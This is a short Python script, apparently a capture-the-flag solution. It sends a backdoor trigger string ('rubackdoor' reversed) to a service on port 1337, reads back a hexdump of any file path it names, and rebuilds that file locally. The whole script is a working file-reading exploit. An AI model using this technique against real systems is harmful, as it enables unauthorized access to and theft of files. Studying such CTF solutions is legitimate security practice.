import socket
import sys

hexdump = b""
raw_file = b""
command = f"scroll!!roodkcabur!\n\x1bfd{sys.argv[1]}\n\x1b\x1b".encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect(("mad", 1337))
    sock.sendall(command)

    for r in iter(lambda: sock.recv(512), b''):
        hexdump += r

for line in hexdump.split(b"\n"):
    try:
        raw_file += b" ".join([b for b in line.split(b"|")[1].strip().split(b" ") if b != b"--"]) # :)
    except:
        pass

with open(sys.argv[1], "wb") as f:
    f.write(bytes.fromhex(raw_file.decode()))
